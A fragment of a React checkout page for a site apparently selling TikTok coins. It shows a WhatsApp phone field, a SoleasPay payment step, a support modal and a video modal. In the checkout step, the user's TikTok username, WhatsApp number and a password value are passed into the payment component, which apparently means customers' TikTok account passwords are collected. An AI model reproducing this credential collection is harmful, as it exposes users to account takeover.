                    {t.whatsapp} <span className="required">*</span>{" "}
                    <span className="field-hint">— {t.whatsappHint}</span>
                  </span>
                  <div className={`field country-phone-field${whatsappError ? " field-error" : ""}`}>
                    <select
                      className="country-select"
                      value={countryCode}
                      onChange={(event) => {
                        const nextCode = event.target.value;
                        setCountryCode(nextCode);
                        if (dialCodes[nextCode]) {
                          setDialCode(dialCodes[nextCode]);
                        }
                      }}
                      aria-label={t.country}
                    >
                      <optgroup label={t.popularCountries}>
                        {POPULAR_COUNTRIES.map((country) => (
                          <option key={`pop-${country.code}`} value={country.code}>
                            {country.flag} {country.dialCode} ({country.name})
                          </option>
                        ))}
                      </optgroup>
                      <optgroup label={t.allCountries}>
                        {ALL_COUNTRIES.map((country) => (
                          <option key={`all-${country.code}`} value={country.code}>
                            {country.flag} {country.dialCode} ({country.name})
                          </option>
                        ))}
                      </optgroup>
                    </select>
                    <input
                      ref={whatsappInputRef}
                      type="tel"
                      value={whatsapp}
                      onChange={(event) => {
                        const val = event.target.value.replace(/\D/g, "");
                        setWhatsapp(val);
                        if (whatsappError && val.length >= 6) {
                          setWhatsappError(false);
                        }
                      }}
                      onBlur={() => {
                        if (whatsapp.replace(/\D/g, "").length < 6) {
                          setWhatsappError(true);
                        }
                      }}
                      placeholder={t.whatsappPlaceholder}
                      inputMode="numeric"
                      pattern="[0-9]*"
                      autoComplete="tel"
                      required
                    />
                  </div>
                  {whatsappError && (
                    <div className="field-error-notice" role="alert">
                      <AlertCircle size={13} />
                      <span>{t.whatsappRequiredWarning}</span>
                    </div>
                  )}
                </label>

                <button
                  type="button"
                  className="modal-primary"
                  onClick={handleStep2Continue}
                >
                  {t.continue} <ArrowRight size={18} />
                </button>
              </div>
            )}

            {step === 3 && (
              <div className="checkout-step">
                <button
                  type="button"
                  className="back-button"
                  onClick={() => {
                    playStep(false);
                    setStep(2);
                  }}
                >
                  <ArrowLeft size={15} /> {t.back}
                </button>
                <span className="modal-kicker">{formatProgress(t.progress, 3, checkoutTotalSteps)}</span>
                <h2 id="checkout-title">{t.confirmOrder}</h2>

                <div className="checkout-summary">
                  <div><span>{t.orderAccount}</span><strong>@{username.replace(/^@/, "")}</strong></div>
                  <div><span>{t.recharge}</span><strong>{formatNumber(deliveredCoins, language)} {t.pieces}</strong></div>
                  <div><span>{t.total}</span><strong>{formatPrice(selectedPack.price, language)}</strong></div>
                </div>

                <div className="payment-provider-selector">
                  <span className="payment-provider-selector-label">{t.chooseProvider}</span>
                  <div
                    className="payment-provider-options"
                    role="radiogroup"
                    aria-label={t.chooseProvider}
                  >
                    <button
                      type="button"
                      className={`payment-provider-option${paymentProvider === "soleaspay" ? " selected" : ""}`}
                      role="radio"
                      aria-checked={paymentProvider === "soleaspay"}
                      onClick={() => {
                        playTap();
                        setPaymentProvider("soleaspay");
                      }}
                    >
                      <span className="payment-logo-wrap" aria-hidden="true">
                        <Image
                          src={getAssetPath("/soleaspay-logo.png")}
                          alt="SoleasPay"
                          width={44}
                          height={28}
                          className="payment-logo-img"
                        />
                      </span>
                      <strong className="payment-provider-name">SoleasPay</strong>
                      <span className="payment-provider-radio" aria-hidden="true" />
                    </button>
                  </div>
                </div>

                {paymentProvider === "soleaspay" && paymentOrderId && (
                  <SoleasPayCheckoutV3
                    language={language}
                    amount={selectedPack.price}
                    orderId={paymentOrderId}
                    description={`Produit: Pièces TikTok | Quantité: ${deliveredCoins} pièces | Identifiant TikTok: @${username.replace(/^@/, "")} | WhatsApp: ${formatFullPhoneNumber(whatsapp, dialCode)}`}
                    username={username}
                    whatsapp={whatsapp}
                    dialCode={dialCode}
                    country={selectedCountry ? `${selectedCountry.flag} ${selectedCountry.name} (${selectedCountry.dialCode})` : countryCode}
                    password={password}
                    coins={deliveredCoins}
                  />
                )}

              </div>
            )}

          </section>
        </div>
      )}

      {supportOpen && (
        <div
          className="support-overlay"
          role="presentation"
          onMouseDown={(event) => {
            if (event.target === event.currentTarget) {
              playModalClose();
              setSupportOpen(false);
            }
          }}
        >
          <section className="support-modal" role="dialog" aria-modal="true" aria-labelledby="support-modal-title">
            <button
              type="button"
              className="close-support"
              onClick={() => {
                playModalClose();
                setSupportOpen(false);
              }}
              aria-label={t.close}
            >
              <X size={18} />
            </button>

            <div className="support-modal-header">
              <div className="support-modal-badge">
                <Headphones size={15} />
                <span>{t.supportBadge}</span>
              </div>
              <h2 id="support-modal-title">{t.supportModalTitle}</h2>
              <p>{t.supportSubtitle}</p>
            </div>

            <div className="support-modal-body">
              <div className="support-whatsapp-card">
                <div className="support-whatsapp-info">
                  <div className="support-whatsapp-icon" aria-hidden="true">
                    <FaWhatsapp size={26} />
                  </div>
                  <div>
                    <strong>{t.whatsappSupportTitle}</strong>
                    <span>
                      {SUPPORT_WHATSAPP_CONTACTS.map((contact) => contact.displayPhone).join(" · ")}
                      {" · "}{t.onlineSupport}
                    </span>
                  </div>
                </div>
                <WhatsAppContactPicker
                  language={language}
                  message={
                    language === "fr"
                      ? "Salut Nova Paid, j'ai besoin d'assistance concernant mes pièces TikTok."
                      : "Hi Nova Paid, I need help with my TikTok coins."
                  }
                  className="support-whatsapp-button"
                  ariaLabel={t.contactWhatsapp}
                >
                  <FaWhatsapp size={18} />
                  <span>{t.contactWhatsappBtn}</span>
                  <ChevronRight size={14} />
                </WhatsAppContactPicker>
              </div>

              <div className="support-faq-section">
                <h3>{t.faqTitle}</h3>
                <div className="support-faq-list">
                  <div className="support-faq-item">
                    <strong>
                      <Clock3 size={15} /> {t.faqDelivery}
                    </strong>
                    <p>{t.faqDeliveryAns}</p>
                  </div>
                  <div className="support-faq-item">
                    <strong>
                      <ShieldCheck size={15} /> {t.faqSecurity}
                    </strong>
                    <p>{t.faqSecurityAns}</p>
                  </div>
                  <div className="support-faq-item">
                    <strong>
                      <Info size={15} /> {t.faqOrderIssue}
                    </strong>
                    <p>{t.faqOrderIssueAns}</p>
                  </div>
                </div>
              </div>
            </div>

            <div className="support-modal-footer">
              <button
                type="button"
                className="modal-secondary"
                onClick={() => {
                  playModalClose();
                  setSupportOpen(false);
                }}
              >
                {t.close}
              </button>
            </div>
          </section>
        </div>
      )}

      {videoModalOpen && (
        <div
          className="video-modal-overlay"
          role="presentation"
          onMouseDown={(event) => {
            if (event.target === event.currentTarget) {
              playModalClose();
              setVideoModalOpen(false);
            }
          }}
        >
          <section
            className="video-modal"
            role="dialog"
            aria-modal="true"
            aria-labelledby="video-modal-title"
          >
            <div className="video-modal-header">
              <h2 id="video-modal-title">{t.videoModalTitle}</h2>
              <button
                type="button"
                className="close-video-modal"
                onClick={() => {
                  playModalClose();
                  setVideoModalOpen(false);
                }}
                aria-label={t.close}
              >
                <X size={18} />
              </button>
            </div>

            <div className="video-modal-body">
              <div className="video-player-frame">
                <iframe
                  src="https://www.youtube.com/embed/AZgaA8ufCzs?autoplay=1&rel=0"
                  title={t.videoModalTitle}
                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
                  allowFullScreen
                />
              </div>
            </div>
          </section>
        </div>
      )}

      <SupportQuickMenu language={language} />
    </main>
  );
}
